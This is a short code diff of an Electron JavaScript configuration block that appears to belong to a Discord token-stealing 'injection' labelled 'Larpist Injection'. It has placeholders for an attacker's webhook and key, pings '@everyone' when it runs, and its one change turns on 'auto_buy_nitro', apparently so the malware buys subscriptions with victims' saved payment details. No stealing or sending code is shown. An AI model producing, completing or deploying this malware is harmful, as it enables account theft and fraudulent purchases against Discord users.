@@ -8,7 +8,7 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
+  auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Larpist Injection', 
